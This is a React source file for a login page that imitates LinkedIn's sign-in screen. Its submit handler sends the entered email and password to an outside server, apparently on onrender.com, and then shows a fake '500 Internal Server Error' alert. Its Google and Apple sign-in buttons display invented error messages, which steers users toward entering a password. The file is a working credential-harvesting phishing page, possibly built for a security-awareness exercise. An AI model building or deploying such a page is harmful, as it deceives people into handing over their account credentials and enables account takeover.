import React, { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Card,
  CardContent,
  CardHeader,
} from "@/components/ui/card";
import { Separator } from "@/components/ui/separator";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { GoogleLogo } from "@/icons/google";
import { AppleLogo } from "@/icons/apple";
import { Checkbox } from "@/components/ui/checkbox";
import logo from "@/images/logo.png";

const App = () => {
  const [formError, setFormError] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [errors, setErrors] = useState({ email: "", password: "", google: "", apple: "" });
  const [loading, setLoading] = useState(false);

  const validateEmail = (email) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!email) return "Email is required";
    if (!emailRegex.test(email)) return "Please enter a valid email";
    return "";
  };

  const validatePassword = (password) => {
    if (!password) return "Password is required";
    if (password.length < 6) return "Password must be at least 6 characters";
    return "";
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setFormError("");
    setLoading(true);

    const emailError = validateEmail(email)
    const passwordError = validatePassword(password);

    setErrors({
      email: emailError,
      password: passwordError,
    });

    if (emailError || passwordError || !email || !password) {
      setLoading(false)
      return
    };

    try {
      const response = await fetch(
        "https://cybersecurity-drive.onrender.com/api/v1/auth/login",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ email, password }),
        }
      );

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "Something went wrong");
      }

      setTimeout(() => {
        setEmail("");
        setPassword("");
        setLoading(false)
      }, 1000)

      return alert("500: Internal Server Error Occurred \nPlease try again later");
    } catch (error) {
      setFormError(error.message);
      setLoading(false)
    }
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center p-4">
      <div className="mb-2 flex justify-start w-full">
        <img src={logo} alt="" className="w-44 h-20 object-contain" />
      </div>

      <Card className="w-full lg:max-w-[25%] min-h-[80%] bg-white rounded-xl shadow-lg shadow-gray-300">
        <form onSubmit={handleSubmit}>
          <CardHeader>
            <h1 className="text-2xl font-semibold text-left">Sign in</h1>
          </CardHeader>

          <CardContent>
            <div className="flex flex-col space-y-4">
              <Button
                variant="outline"
                type="button"
                className="w-full rounded-3xl text-gray-600 text-base"
                onClick={() => setErrors({ google: "Error 8: Internal error occurred" })}
                disabled={loading}
              >
                <GoogleLogo className={"w-8 h-8"} />
                Continue with Google
              </Button>
              {errors.google && (
                <p className="text-sm text-red-500">{errors.google}</p>
              )}

              <Button
                variant="outline"
                type="button"
                className="w-full rounded-3xl text-gray-600 text-base"
                onClick={() => setErrors({ apple: "Apple ID: Error 503. An internal issue occurred." })}
                disabled={loading}
              >
                <AppleLogo />
                Sign in with Apple
              </Button>
              {errors.apple && (
                <p className="text-sm text-red-500">{errors.apple}</p>
              )}
            </div>

            <div className="relative w-full mt-4">
              <Separator className="my-4 border border-gray-200" />
              <span className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 bg-white px-2 text-gray-500 text-sm">
                or
              </span>
            </div>
          </CardContent>

          <CardContent className="space-y-4 flex flex-col items-start w-full">
            {formError && (
              <Alert variant="destructive">
                <AlertDescription>{formError}</AlertDescription>
              </Alert>
            )}

            <div className="space-y-4 w-full">
              <Input
                type="email"
                placeholder="Email or Phone"
                className={`w-full px-3 py-2 border-gray-500 ${errors.email ? "border-red-500" : ""
                  }`}
                value={email}
                onChange={(e) => {
                  setEmail(e.target.value);
                  if (errors.email) {
                    setErrors((prev) => ({ ...prev, email: "" }));
                  }
                }}
                disabled={loading}
              />
              {errors.email && (
                <p className="text-sm text-red-500">{errors.email}</p>
              )}
            </div>

            <div className="space-y-2 w-full">
              <Input
                type="password"
                placeholder="Password"
                className={`w-full px-3 py-2 border-gray-500 ${errors.password ? "border-red-500" : ""
                  }`}
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  if (errors.password) {
                    setErrors((prev) => ({ ...prev, password: "" }));
                  }
                }}
                disabled={loading}
              />
              {errors.password && (
                <p className="text-sm text-red-500">{errors.password}</p>
              )}
            </div>

            <Button
              variant="link"
              className="text-blue-600 hover:text-blue-800 p-0 "
            >
              Forgot password?
            </Button>

            <div className="flex items-center space-x-2">
              <Checkbox
                id="remember"
                className="data-[state=checked]:bg-blue-500 rounded-lg data-[state=checked]:text-white data-[state=checked]:border-transparent"
                disabled={loading}
              />
              <label htmlFor="#remember">Keep me logged in</label>
            </div>

            <Button
              type="submit"
              className="w-[95%] py-6 bg-blue-700 hover:bg-blue-700 text-white rounded-3xl items-center mx-auto"
              disabled={loading}
            >
              Sign in
            </Button>
          </CardContent>
        </form>
      </Card>

      <div className="mt-6 text-center">
        <p className="text-sm">
          New to LinkedIn?{" "}
          <Button
            variant="link"
            className="text-blue-600 hover:text-blue-800 p-0"
          >
            Join now
          </Button>
        </p>
      </div>
    </div>
  );
};

export default App;
